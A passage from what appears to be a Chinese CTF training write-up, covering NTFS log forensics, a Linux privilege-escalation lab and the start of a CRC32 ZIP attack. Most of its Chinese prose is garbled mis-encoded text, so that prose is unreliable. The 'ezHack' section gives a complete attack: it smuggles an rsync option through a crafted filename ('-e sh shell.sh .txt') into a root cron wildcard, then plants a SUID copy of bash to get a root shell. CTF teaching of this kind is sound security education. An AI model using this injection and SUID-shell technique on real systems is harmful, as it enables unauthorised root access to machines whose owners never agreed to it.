lf_UndoChunkSize INTEGER,         -- æ’¤é”€æ“ä½œæ•°æ®å—å¤§å°
```

* æ ‡å¿—å’ŒçŠ¶æ€å­—æ®µ

```text
lf_flags INTEGER,                 -- è®°å½•æ ‡å¿—ä½
lf_target_attribute INTEGER,      -- ç›®æ ‡å±æ€§ç±»å‹
lf_lcns_to_follow INTEGER,        -- è¦è·Ÿéšçš„LCNæ•°é‡
lf_attribute_offset INTEGER,      -- å±æ€§åç§»é‡
lf_MftClusterIndex INTEGER,       -- MFTç°‡ç´¢å¼•
lf_target_vcn INTEGER,            -- ç›®æ ‡è™šæ‹Ÿç°‡å·
lf_target_lcn INTEGER,            -- ç›®æ ‡é€»è¾‘ç°‡å·
InOpenAttributeTable INTEGER,     -- æ˜¯å¦åœ¨æ‰“å¼€å±æ€§è¡¨ä¸­
FromRcrdSlack INTEGER,            -- æ˜¯å¦æ¥è‡ªè®°å½•slackç©ºé—´
IncompleteTransaction INTEGER     -- æ˜¯å¦æ˜¯ä¸å®Œæ•´äº‹åŠ¡
```

ä¸Šé¢çš„ä¿¡æ¯ä¸ç”¨å…¨éƒ¨è®°ä¸‹ï¼Œç»™è¯¦ç»†è¯´å‡ ä¸ªä¸‹é¢å‘½ä»¤è¦ç”¨çš„

```text
lf_UsnJrlTimestamp, lf_UsnJrlReason, lf_FileName,lf_UsnJrlReason,lf_LSN
```

* lf_LSN æ—¥å¿—åºåˆ—å·ï¼Œæ˜¯æ—¥å¿—è®°å½•ä¸­ï¼Œæ–‡ä»¶æ“ä½œçš„ç»å¯¹æ—¶é—´é¡ºåºï¼Œå€¼è¶Šå¤§æ˜¾å¾—æ–‡ä»¶è¶Šæ–°

* lf_FileName æ—¥å¿—è®°å½•çš„æ–‡ä»¶åï¼Œé‡å‘½åå‰åçš„æ–‡ä»¶åéƒ½æœ‰ï¼Œå®ƒå®æ—¶æ›´æ–°çš„ï¼Œæ‰€ä»¥è¯´ä¹‹å‰çš„æ–‡ä»¶åå’Œä¹‹åçš„æ–‡ä»¶åéƒ½ä¼šè¢«è®°å½•çš„

* lf_UsnJrlFileNameUSN æ—¥å¿—ä¸­çš„æ–‡ä»¶åï¼Œè¿™ä¸ª USN æ˜¯å•ç‹¬çš„ä¸€ä¸ªè®°å½•æ–‡ä»¶æ“ä½œçš„å°æ—¥å¿—æ¿å—

* lf_UsnJrlTimestampUSN æ—¥å¿—æ—¶é—´æˆ³ï¼Œè®°å½•æ–‡ä»¶æ“ä½œæ—¶å€™çš„æ—¶é—´ä¿¡æ¯

* lf_UsnJrlReasonUSN å˜æ›´åŸå› ï¼Œè¿™ä¼šè®°å½•æ–‡ä»¶æ“ä½œçš„äº‹ä»¶ï¼Œæ¯”å¦‚è¯´æ–‡ä»¶åˆ›å»ºï¼Œåˆ é™¤ï¼Œé‡å‘½åï¼Œæ–‡ä»¶å…³é—­ï¼Œæ•°æ®æ‰©å±•ç­‰ç­‰

```sql
SELECT lf_UsnJrlTimestamp, lf_UsnJrlReason, lf_FileName FROM LogFile WHERE lf_UsnJrlReason LIKE '%RENAME%' ORDER BY lf_LSN;
```

è¿™æ˜¯ SQL è¯­å¥ï¼Œå­¦å¼Ÿå­¦å¦¹ä»¬éœ€è¦è‡ªå­¦ï¼Œæˆ‘è¿™é‡Œè§£é‡Šä¸‹å®ƒ

`SELECT lf_UsnJrlTimestamp, lf_UsnJrlReason, lf_FileName`

æ˜¯è¯´åªæ˜¾ç¤ºè¿™ä¸‰ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯æ“ä½œå‘ç”Ÿçš„æ—¶é—´ï¼Œæ“ä½œç±»å‹ï¼Œæ¶‰åŠçš„æ–‡ä»¶å

`FROM LogFile`æŒ‡å®šäº†æ•°æ®æºï¼Œå°±æ˜¯æˆ‘ä»¬ä¸Šé¢`.tables`çš„ç»“æœ

`WHERE lf_UsnJrlReason LIKE '%RENAME%'`

è¿™é‡Œå¢åŠ äº†è¿‡æ»¤æ¡ä»¶ï¼Œéœ€è¦é‚£ä¸ªå˜æ›´åŸå› è¿›è¡Œæ¨¡ç³ŠåŒ¹é… RENAME

`ORDER BY lf_LSN;`

å¯¹è¾“å‡ºç»“æœè¿›è¡Œæ’åºï¼ŒæŒ‰ç…§æ—¥å¿—åºåˆ—å·æ’åºï¼Œå¯ä»¥ç¡®ä¿æ­£ç¡®çš„é¡ºåº

åœ¨è¿”å›ç»“æœä¸­ï¼Œæˆ‘ä»¬å‘ç°é‡å‘½åæ“ä½œæ˜¯ä»æ•°å­—.txt åˆ°å­—æ¯.datï¼Œå¯ä»¥æƒ³åˆ°ï¼Œè¿™é‡Œé¢æˆ‘éšå†™äº† flag

ç„¶åä»æ•°å­—è½¬æ¢å­—èŠ‚ï¼Œpython ä¸€ä¸ª num.to_bytes å°±å¥½äº†å§

```python
def num_to_string(num):
	num_bytes=(num.bit_length()+7)//8 #è¿™æ˜¯ç”±äºnum.to_byteséœ€è¦æŒ‡å®šå­—èŠ‚é•¿åº¦ï¼Œæ‰€ä»¥æˆ‘è¿™æ ·å†™çš„ï¼Œä¼šè‡ªåŠ¨å‘ä¸Šå–æ•´ï¼Œç¡®ä¿è½¬æ¢å‡ºæ¥çš„å­—èŠ‚å®Œæ•´
	byte_data=num.to_bytes(num_bytes,'big')
	return byte_data.decode('utf-8',errors='ignore')
numbers=[
	13643046854681979,
    6426765720352224837,
    6876554908428166514,
    28539333146592819,
    555819389
]
flag_parts=[num_to_string(n) for n in numbers]
flag=''.join(flag_parts)
print(f"{flag}")
"""
0xGame{Y0u_H@vE_nnAsTered_NTF3!!!}
"""
```

### ezHack

> Yolo å¥½ä¹…ä¹‹å‰æ‰“çš„ä¸€ä¸ªæ¸—é€ï¼Œææƒçš„æ—¶å€™é‡åˆ°çš„ï¼Œæ„Ÿè§‰ä¸é”™ï¼Œå°±å†™äº†ä¸ª docker ç»™å¤§å®¶ç©\
> å› ä¸ºææƒæ–¹å¼å¾ˆå¤šå¾ˆæ‚ï¼Œæ‰€ä»¥è¿™ä¸ªæˆè¯¾æˆ‘é€‰æ‹©è¾¹æ‰“è¾¹è®²ï¼Œç„¶åææƒæ‰‹æ®µä¹Ÿæ˜¯ç›´æ¥è¯´æ¸…æ¥šæ€ä¹ˆææƒï¼Œä¸­é—´çš„å°è¯•éƒ¨åˆ†å°±ä¸ä¸ºå¤§å®¶èµ˜å™äº†

ssh é¶æœºè¿æ¥æˆ‘ä¸è¯¦è¿°äº†ï¼Œå¿˜è®°äº†å›å»çœ‹ week1

è¿æ¥ä¸Šå,éšä¾¿è¾“å…¥å‘½ä»¤

```bash
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ ls
hello.txt
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ cat hello.txt
hello ,you can be better hacker.
 The flag is in /root/
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ ls /root
ls: cannot open directory '/root': Permission denied
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$
```

ä¼šå‘ç°å½“å‰æ˜¯ ctf ç”¨æˆ·ï¼Œç„¶åå®¶ç›®å½•ä¸­æœ‰ä¸ª hello.txt,å‘Šè¯‰æˆ‘ä»¬ï¼Œflag åœ¨/root/ä¸‹é¢ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦å…ˆæƒ³åŠæ³•ææƒ

> å½“å‰æ¨¡æ‹Ÿæ¸—é€åœºæ™¯æ˜¯ï¼Œæˆ‘ä»¬é€šè¿‡å‰é¢çš„ http æœåŠ¡æ¼æ´æˆ–å…¶ä»– ssh,smb æœåŠ¡ç­‰ç­‰,æ‹¿åˆ°äº†ä¸€ä¸ªè¾ƒä½æƒé™çš„ç”¨æˆ·ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•é€šè¿‡ root ç”¨æˆ·é…ç½®ä¸å½“çš„æ¼æ´ï¼Œè¿›è¡ŒåŠ«æŒææƒæ“ä½œï¼Œæ¸—é€çš„ä¸–ç•Œè¿˜æ˜¯å¾ˆå¤§å¾ˆå¤§ï¼Œæ–¹æ³•ä¹Ÿäº”èŠ±å…«é—¨ï¼Œæˆ‘ä¹Ÿä¸èƒ½ä¿è¯æ‹¿åˆ°ä¸€ä¸ªé¶æœºå°±èƒ½æ¸—é€è¿›å»ææƒï¼Œæ‰€ä»¥å¸Œæœ›å’Œå¤§å®¶å…±å‹‰ï¼ï¼ï¼

#### how to root

ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹å®šæ—¶ä»»åŠ¡ï¼ŒLinux ä¸­ï¼Œå¸¸è§å®šæ—¶ä»»åŠ¡çš„æ–‡ä»¶é…ç½®è·¯å¾„æ˜¯/etc/cron.dï¼Œç„¶åæˆ‘ä»¬éœ€è¦ä½¿ç”¨`ls -la`æ£€æµ‹ï¼Œæœ‰æ²¡æœ‰å¯ä»¥è¯»å†…å®¹çš„ root å®šæ—¶ä»»åŠ¡ï¼ˆè¿™é‡Œå°±æ˜¯ root ç”¨æˆ·å¯¹äºå®šæ—¶ä»»åŠ¡æƒé™çš„é…ç½®ä¸å½“ï¼Œä½æƒé™ç”¨æˆ·åˆ©ç”¨ root å¯åŠ¨çš„å®šæ—¶ä»»åŠ¡ï¼Œå®Œå…¨å¯ä»¥å®ç°ææƒï¼Œä¸‹é¢å‡ ä¸ªæ–‡ä»¶ï¼Œä¼šå‘ç°ï¼Œæˆ‘ä»¬å¯¹äºä¸‰ä¸ªå®šæ—¶ä»»åŠ¡éƒ½å¯è¯»ï¼Œå› ä¸º`-rw-r--r--`

```bash
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ ls -la /etc/cron.d
total 20
drwxr-xr-x 1 root root 4096 Oct  8 14:08 .
drwxr-xr-x 1 root root 4096 Oct  8 14:08 ..
-rw-r--r-- 1 root root  102 Mar  2  2023 .placeholder
-rw-r--r-- 1 root root  122 Oct  8 13:08 ctf_backup_job
-rw-r--r-- 1 root root  201 Jun  6 17:12 e2scrub_all
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ cat /etc/cron.d/ctf_backup_job
* * * * * root /bin/sh -c "cd /home/ctf && rsync -t *.txt 0xGame:/tmp/backup/"
# congratulations!,this is key to be king!
```

è¯»å–/etc/cron.d/ctf_backup_jobï¼Œå‘ç°å®ƒæ˜¯æ¯ä¸€åˆ†é’Ÿéƒ½ä¼šæ‰§è¡Œä¸€æ¬¡çš„ rsync åŒæ­¥æ–‡ä»¶å‘½ä»¤ï¼Œç„¶åæœ€æœ€é‡è¦çš„ç‚¹æ˜¯ï¼Œå®ƒæ˜¯ root ä¸‹çš„å®šæ—¶ä»»åŠ¡

`rsync -t *.txt 0xGame:/tmp/backup/`è¯»å–è·¯å¾„ä¸‹æ‰€æœ‰ txt æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶åŒæ­¥åˆ°è¿œç¨‹ä¸»æœºçš„/tmp/backup/è·¯å¾„ä¸‹ï¼Œ-t æ˜¯å¸¦ä¸Šæ—¶é—´æˆ³

è¿™é‡Œæˆ‘ç»™å‡ºçš„ææƒæ–¹å¼æ˜¯å‘½ä»¤åŠ«æŒï¼Œå…ˆä½¿ç”¨ rsync --help åˆ†ææ‰€æœ‰åŠŸèƒ½

å…³æ³¨è¿™é‡Œï¼Œæ„æ€æ˜¯è¯´ rsync å…è®¸æˆ‘ä»¬æŒ‡å®šä¸€ä¸ªç¨‹åºè¿›è¡Œè¿œç¨‹è¿æ¥ä¸»æœºï¼Œè¿™é‡Œçš„ COMMAND å¯ä»¥æ˜¯ bash å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œç ”ç©¶äº†è¿™ä¹ˆä¹…çš„ Linuxï¼Œå¤§å®¶åº”è¯¥æœ‰æ‰€ä½“ä¼šï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶åæ˜¯ä¸å¯èƒ½å‡ºç°'/'è¿™æ ·çš„ç‰¹æ®Šç¬¦å·çš„,ä½†æ˜¯æˆ‘ä»¬å®Œå…¨å¯ä»¥æŒ‡å®š shell è„šæœ¬æ–‡ä»¶ï¼ˆè™½è¯´ rsync æœ¬æ„æ˜¯ä¸ºäº†è®©æˆ‘ä»¬ç”¨è„šæœ¬è¾…åŠ©è¿œç¨‹è¿æ¥ï¼Œä½†æ˜¯ä¸ç®¡æœ‰æ²¡æœ‰è¿œç¨‹è¿æ¥æˆåŠŸï¼Œè¿™ä¸ªè„šæœ¬éƒ½ä¼šè¢« root æ‰§è¡Œï¼Œè¿™ä¹Ÿå°±ç»™æˆ‘ä»¬ææƒæœºä¼šäº†

```bash
echo -e '#!/bin/bash\ncp /bin/bash /home/ctf/rootbash\nchmod u+s /home/ctf/rootbash' > shell.sh
```

ç”¨å‘½ä»¤è¡Œåˆ›å»ºæ–‡ä»¶çš„æ–¹å¼å¾ˆå¤šï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™ï¼Œç³»ç»Ÿæ²¡æœ‰æä¾› nano,vim,vi ç­‰æ–‡æœ¬ç¼–è¾‘å·¥å…·ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨å…¶ä»–å‘½ä»¤ä»£æ›¿ï¼Œæ¯”å¦‚è¯´ echo,printf,cat ç­‰ç­‰ã€‚

æˆ‘è¿™é‡Œä½¿ç”¨ echo å‘½ä»¤ï¼Œç„¶åå†™äº†ä¸ªå¯ä»¥å¤åˆ¶/etc/bash çš„å‘½ä»¤ï¼Œå†åŠ äº†ä¸ª suid æƒé™ï¼Œè¿™ä¹ˆå¤šå†…å®¹ï¼Œæ˜¾ç„¶ä¸èƒ½ç›´æ¥å†™å…¥ï¼Œæˆ‘æŒ‡å®šäº†-eï¼Œå¯ä»¥æ‰§è¡Œä¸€äº›ç‰¹å®šå‘½ä»¤ï¼Œæ¯”å¦‚\n æ¢è¡Œç­‰ç­‰

æœ€åæ•ˆæœå¦‚ä¸Š

> **æ‹“å±•**\
> æ¸©é¦¨æç¤ºï¼Œ#!/bin/bash è¿™ä¸€è¡Œå¯ä»¥çœç•¥ï¼Œä½†æ˜¯è¿˜æ˜¯å»ºè®®ä¿ç•™\
> è¿™ä¸ªè¢«å«åš`Shebang` ï¼Œå¦‚æœæˆ‘ä»¬ä¸æŒ‡å®š sh ä¹Ÿå¯ä»¥æ‰§è¡Œï¼Œç›´æ¥./shell.sh å°±å¥½äº†ï¼Œä½†æ˜¯ï¼ï¼ï¼ä¸€å®šè¦æå‰`chmod +x shell.sh`ï¼Œç»™å®ƒåŠ ä¸ªæ‰§è¡Œæƒé™ï¼Œè¿™é‡Œå¤§å®¶äº†è§£å­¦ä¹ 

ç„¶åè¿™é‡Œä¸ä¸€å®šè¦å†™æˆ‘è¿™æ ·çš„å‘½ä»¤ï¼Œæœ‰ç®€å•çš„ï¼Œç›´æ¥ ls /root/ç¡®å®š flag.txtï¼Œç„¶å cat /root/flag.txtï¼›ä¹Ÿæœ‰éš¾çš„ï¼Œç›´æ¥å°†å½“å‰ç”¨æˆ·æ‹‰è¿› root æƒé™ç»„ï¼Œæˆ–è€…è¯´ç¼–è¾‘/etc/sudoers æ–‡ä»¶ï¼Œè®©å½“å‰ç”¨æˆ·å¯ä»¥æ— å¯†ç æ‰§è¡Œ sudo ç­‰ç­‰

ç„¶åæ˜¯å…³é”®éƒ¨åˆ†ï¼ˆä¸ç®¡ä¸Šé¢ä½ ä»¬ç”¨çš„ä»€ä¹ˆç‰ˆæœ¬ææƒï¼Œéƒ½å¿…é¡»ç»è¿‡è¿™ä¸€æ­¥

```bash
touch -- '-e sh shell.sh    .txt'
```

touch æ˜¯ Linux åˆ›å»ºæ–‡ä»¶çš„å‘½ä»¤ï¼Œ--æ˜¯é€‰é¡¹ç»ˆæ­¢ç¬¦ï¼ˆå°±æ˜¯è¯´ä¸è§£æåé¢æ–‡ä»¶åé‡Œçš„-eï¼‰ä¸ç„¶æˆ‘ä»¬æ ¹æœ¬åˆ›å»ºä¸äº†è¿™æ ·çš„æ–‡ä»¶ï¼Œsh æ˜¯è°ƒç”¨äº†/bin/shï¼Œç”¨æ¥æ‰§è¡Œ shell.sh é‡Œé¢çš„å†…å®¹

ç­‰å¾…ç‰‡åˆ»ï¼Œä¼šå‘ç°å½“å‰è·¯å¾„å‡ºç°äº† rootbash

```bash
ctf@dep-1cf51ecf-457b-422d-823d-9c8104b746b6-5ffc77b68c-rff4g:~$ ls -la
total 1272
-rw-r--r-- 1 ctf  ctf        0 Oct 16 13:02 '-e sh shell.sh    .txt'
drwxr-xr-x 1 ctf  ctf     4096 Oct 16 13:04  .
drwxr-xr-x 1 root root    4096 Oct  8 13:29  ..
-rw------- 1 ctf  ctf       84 Oct 16 13:10  .bash_history
-rw-r--r-- 1 ctf  ctf      220 Jun  6 14:38  .bash_logout
-rw-r--r-- 1 ctf  ctf     3526 Jun  6 14:38  .bashrc
-rw-r--r-- 1 ctf  ctf      807 Jun  6 14:38  .profile
-rw-r--r-- 1 ctf  ctf       56 Oct  8 14:08  hello.txt
-rwsr-xr-x 1 root root 1265648 Oct 16 13:13  rootbash
-rw-r--r-- 1 ctf  ctf       73 Oct 16 13:03  shell.sh
```

å€¼å¾—é«˜å…´ï¼Œrootbash æ˜¯ root æƒé™æ–‡ä»¶ï¼Œè€Œä¸”è¿˜ç»™äº† suid ä½

æ¥ä¸‹æ¥æˆ‘ä»¬è¦æ˜¯ç›´æ¥./rootbash çš„è¯ï¼Œä¼šå‘ç°å¤±è´¥ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰æ‹¿åˆ° root æƒé™ï¼Œè¿™æ˜¯å› ä¸ºç°ä»£ Linux ç³»ç»Ÿä¸­çš„ **Bash Shell** åŒ…å«äº†ä¸€ä¸ª**å®‰å…¨æœºåˆ¶**ï¼Œå½“å®ƒæ£€æµ‹åˆ°è‡ªå·±æ˜¯ä»¥ **SUID/SGID** æƒé™è¿è¡Œæ—¶ï¼Œ**ä¼šæ•…æ„é™çº§æƒé™ï¼Œé¿å…è¢«ç”¨äºææƒæ”»å‡»ã€‚**

ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡`./rootbash -p`æŒ‡å®š bash è¦ä¿ç•™æœ‰æ•ˆç”¨æˆ· idï¼ˆå› ä¸ºæ˜¯ root åˆ›å»ºçš„ï¼Œè‡ªç„¶å°±æ˜¯ root çš„ id

```bash
ctf@dep-1cf51ecf-457b-422d-823d-9c8104b746b6-5ffc77b68c-rff4g:~$ ./rootbash -p
rootbash-5.2# id
uid=1000(ctf) gid=1000(ctf) euid=0(root) groups=1000(ctf)
rootbash-5.2# whoami
root
rootbash-5.2# ls /root
flag.txt
rootbash-5.2# cat /root/flag.txt
0xGame{Game_over_you_@re_gonna_Be_the_champ_of_CTFers!!!}
```

è¯·çœ‹ï¼Œå½“å‰æˆ‘ä»¬è™½è¯´è¿˜æ˜¯ ctf çš„ç”¨æˆ·ï¼Œä½†æ˜¯ euid æ˜¯ root çš„ï¼Œç„¶å whoami å›å¤çš„æ˜¯å½“å‰ shell çš„ç”¨æˆ·åï¼ˆå¯ä»¥ç†è§£æˆæ‰§è¡Œ./rootbash ä¼šè°ƒç”¨ä¸€ä¸ªæ–°çš„ shell

##### ä¸€äº› Q&A

###### ä¸ºä»€ä¹ˆ `uid` è¿˜æ˜¯ `ctf`ï¼Ÿ

* **UID (User ID)**ï¼š**å®é™…ç”¨æˆ· ID**ã€‚è¿™å°±åƒæˆ‘ä»¬çš„**çœŸå®èº«ä»½è¯**ã€‚æ— è®ºæˆ‘ä»¬åšä»€ä¹ˆï¼Œå‘èµ·è¿™ä¸ªæ“ä½œçš„çœŸå®èº«ä»½å§‹ç»ˆæ˜¯ `ctf` (`uid=1000`)ã€‚

* **ç»“è®ºï¼š** æˆ‘ä»¬çš„ç™»å½•èº«ä»½æ²¡æœ‰æ”¹å˜ï¼Œä»ç„¶æ˜¯ä» `ctf` ç”¨æˆ·çš„ä¼šè¯ä¸­å‘èµ·çš„æ“ä½œã€‚

###### 2. ä»€ä¹ˆæ˜¯ `euid`ï¼Ÿâ€”â€” æƒé™çš„ä¸´æ—¶â€œå·¥ç‰Œâ€

* **EUID (Effective User ID)**ï¼š**æœ‰æ•ˆç”¨æˆ· ID**ã€‚è¿™æ‰æ˜¯ç³»ç»Ÿè¿›è¡Œ**æƒé™æ£€æŸ¥**æ—¶æ‰€ä¾æ®çš„èº«ä»½ã€‚å¯ä»¥æŠŠ EUID ç†è§£ä¸ºæˆ‘ä»¬çš„**ä¸´æ—¶â€œå·¥ç‰Œâ€æˆ–â€œé€šè¡Œè¯â€**ã€‚

* **SUID æœºåˆ¶çš„å·¥ä½œåŸç†ï¼š**

  * å½“ä¸€ä¸ªå¸¦æœ‰ SUID æƒé™ï¼ˆæ‰€æœ‰è€…æ˜¯ `root`ï¼‰çš„ç¨‹åºè¢«æ‰§è¡Œæ—¶ï¼ŒLinux å†…æ ¸ä¼šæŠŠæ‰§è¡Œè€…çš„ **EUID** **ä¸´æ—¶ä¿®æ”¹**æˆè¯¥æ–‡ä»¶çš„**æ‰€æœ‰è€…**çš„ UIDã€‚

  * åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œ`./rootbash` çš„æ‰€æœ‰è€…æ˜¯ `root (0)`ï¼Œæ‰€ä»¥å½“ `ctf` ç”¨æˆ·è¿è¡Œå®ƒæ—¶ï¼Œ**EUID ä¸´æ—¶å˜æˆäº†&#x20;**`0(root)`ã€‚

* **ç»“è®ºï¼š** ä½ è™½ç„¶è¿˜æ˜¯ `ctf` æœ¬äººï¼ˆUIDï¼‰ï¼Œä½†ä½ ç°åœ¨ä½©æˆ´äº†ä¸€å¼  â€œRoot æƒé™â€ çš„å·¥ç‰Œï¼ˆEUIDï¼‰ï¼Œç³»ç»Ÿå…è®¸ä½ æ‰§è¡Œ Root æ‰èƒ½è¿›è¡Œçš„æ“ä½œï¼ˆå¦‚ `cat /root/flag.txt`ï¼‰ã€‚

###### 3. `whoami` ä¸ºä»€ä¹ˆæ˜¾ç¤º `root`ï¼Ÿ

æ‰§è¡Œ**`./rootbash -p` æœ¬è´¨ä¸Šè°ƒç”¨äº†ä¸€ä¸ªæ–°çš„ Shell**ã€‚

* å½“ä½ åœ¨ SUID Shell ä¸­è¿è¡Œ `whoami` å‘½ä»¤æ—¶ï¼Œå®ƒå¹¶ä¸æ˜¯å›å¤ä½ çš„ç™»å½•ç”¨æˆ·åï¼Œè€Œæ˜¯å»æŸ¥è¯¢**å½“å‰æ‰§è¡Œå®ƒçš„è¿™ä¸ªè¿›ç¨‹çš„ EUID** å¯¹åº”çš„ç”¨æˆ·åã€‚

* å› ä¸ºè¿™ä¸ª SUID Shell çš„ EUID æ˜¯ `root`ï¼Œæ‰€ä»¥å®ƒç†æ‰€å½“ç„¶åœ°å›ç­”ï¼šâ€œæˆ‘æ˜¯ `root`â€

> æ¸—é€çœŸçš„å¾ˆé‡è§†å®æˆ˜ï¼Œå­¦é•¿å»ºè®®å¯¹è¿™æ–¹é¢æ„Ÿå…´è¶£çš„å­¦å¼Ÿå­¦å¦¹è¦å¤šåœ¨é¶æœºç½‘ç«™æ‰“ï¼Œç§¯ç´¯è¶³å¤Ÿå¤šçš„ç»éªŒï¼Œè¿™å¯¹åé¢æ‰“æŠ¤ç½‘ã€å®‰å…¨ç ”ç©¶ã€å®‰å…¨ç¨³å›ºç­‰ç­‰å®æ“ä¸­å¸®åŠ©å¾ˆå¤§å¾ˆå¤§

### å¼€é”å¸ˆå‚… 2.0

> æœ¬é¢˜è€ƒå¯Ÿäº† CRC32 çˆ†ç ´æ”»å‡»ï¼ˆåŸç†è§’åº¦

è¿™æœ‰ä¸¤ä¸ªé‡è¦æ¦‚å¿µéœ€è¦æ¸…æ¥šï¼ˆæ¥è‡ª Gemini è€å¸ˆ

**CRC32 æ˜¯ä»€ä¹ˆï¼Ÿ**

* **å…¨ç§°**ï¼šCyclic Redundancy Checkï¼Œå¾ªç¯å†—ä½™æ ¡éªŒã€‚

* **ç”¨é€”**ï¼šå®ƒæ˜¯ä¸€ç§**æ•°æ®å®Œæ•´æ€§æ ¡éªŒ**ç®—æ³•ï¼Œè€Œä¸æ˜¯åŠ å¯†ç®—æ³•ã€‚å®ƒçš„ä¸»è¦ç›®çš„æ˜¯æ£€æŸ¥æ•°æ®åœ¨ä¼ è¾“æˆ–å­˜å‚¨è¿‡ç¨‹ä¸­æ˜¯å¦å‘ç”Ÿäº†æ„å¤–çš„æŸåæˆ–æ”¹å˜ã€‚

* **åŸç†**ï¼šå®ƒä¼šæ ¹æ®æ–‡ä»¶çš„äºŒè¿›åˆ¶å†…å®¹ï¼Œé€šè¿‡ä¸€å¥—å›ºå®šçš„æ•°å­¦è¿ç®—ï¼Œç”Ÿæˆä¸€ä¸ª 32 ä½çš„æ•´æ•°å€¼ï¼ˆå³ CRC32 æ ¡éªŒç ï¼‰ã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆæ˜¯æ–‡ä»¶çš„ä¸€ä¸ªéå¸¸ç®€å•çš„â€œæŒ‡çº¹â€ã€‚å¦‚æœæ–‡ä»¶çš„ä»»ä½•ä¸€ä¸ªæ¯”ç‰¹ï¼ˆbitï¼‰å‘ç”Ÿäº†æ”¹å˜ï¼Œé‚£ä¹ˆé‡æ–°è®¡ç®—å‡ºçš„ CRC32 å€¼æœ‰æå¤§çš„æ¦‚ç‡ä¼šä¸åŒã€‚

* **å…³é”®ç‰¹æ€§**ï¼šè®¡ç®—é€Ÿåº¦éå¸¸å¿«ã€‚

**ZIP å‹ç¼©åŒ…çš„ç»“æ„**

* ä¸€ä¸ª ZIP åŒ…é‡Œå¯ä»¥åŒ…å«å¤šä¸ªæ–‡ä»¶ã€‚å¯¹äºæ¯ä¸ªæ–‡ä»¶ï¼ŒZIP æ ¼å¼éƒ½ä¼šå­˜å‚¨ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼š

  * **æ–‡ä»¶æ•°æ®ï¼ˆFile Dataï¼‰**ï¼šè¿™æ˜¯æ–‡ä»¶æœ¬èº«çš„å†…å®¹ï¼Œç»è¿‡å‹ç¼©å’ŒåŠ å¯†ã€‚

  * **æ–‡ä»¶å…ƒæ•°æ®ï¼ˆMetadata/Headerï¼‰**ï¼šè¿™æ˜¯æè¿°æ–‡ä»¶ä¿¡æ¯çš„æ•°æ®ï¼Œæ¯”å¦‚æ–‡ä»¶åã€åŸå§‹å¤§å°ã€å‹ç¼©åçš„å¤§å°ï¼Œä»¥åŠæœ€é‡è¦çš„â€”â€”**åŸå§‹æ–‡ä»¶ï¼ˆæœªåŠ å¯†å‰ï¼‰çš„ CRC32 æ ¡éªŒç **ã€‚

* **è‡´å‘½ç¼ºé™·**ï¼šåœ¨ä½¿ç”¨ä¼ ç»Ÿçš„ ZipCrypto åŠ å¯†æ—¶ï¼Œ**æ–‡ä»¶æ•°æ®æœ¬èº«æ˜¯è¢«åŠ å¯†çš„ï¼Œä½†åŒ…å« CRC32 å€¼çš„è¿™éƒ¨åˆ†å…ƒæ•°æ®å´æ˜¯ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨çš„ï¼Œæ²¡æœ‰è¢«åŠ å¯†**ã€‚

***

å›åˆ°è¿™ä¸€éƒ¨åˆ†è®²è§£çš„ crc32 çˆ†ç ´æ”»å‡»ï¼Œå®ƒæœ‰å±€é™æ€§ï¼Œè¿™ç§æ”»å‡»ä¸»è¦é’ˆå¯¹çš„æ˜¯`ZipCrypto`ç®—æ³•ï¼Œç„¶åæ–‡ä»¶çš„æœªå‹ç¼©å¤§å°éƒ½åº”è¯¥è¶³å¤Ÿå°ï¼Œæœ€å¥½æ˜¯ 6 å­—èŠ‚ä»¥ä¸‹

å…³æ³¨çš„æ˜¯è¿™ä¸€éƒ¨åˆ†ï¼Œç”¨ bandzip æˆ–å…¶ä»– zip è§£å‹å·¥å…·ä¹Ÿèƒ½çœ‹åˆ°ï¼ŒåŸºæœ¬ä¸Šéƒ½å«åš**åŸå§‹å¤§å°**

ä»”ç»†å…³æ³¨çš„è¯ï¼Œä¼šå‘ç°æˆ‘å‹ç¼©åŒ…é‡Œé¢å‡ºç°å°æ–‡ä»¶çš„å¤§å°ç¨å¾®æœ‰ç‚¹éšæœºï¼Œæœ‰ 1 å­—èŠ‚å’Œ 3 å­—èŠ‚ï¼Œè¿˜æœ‰ä¸¤ä¸ªå…¶ä»–æ–‡ä»¶

#### crc32 çˆ†ç ´æ”»å‡»åŸç†

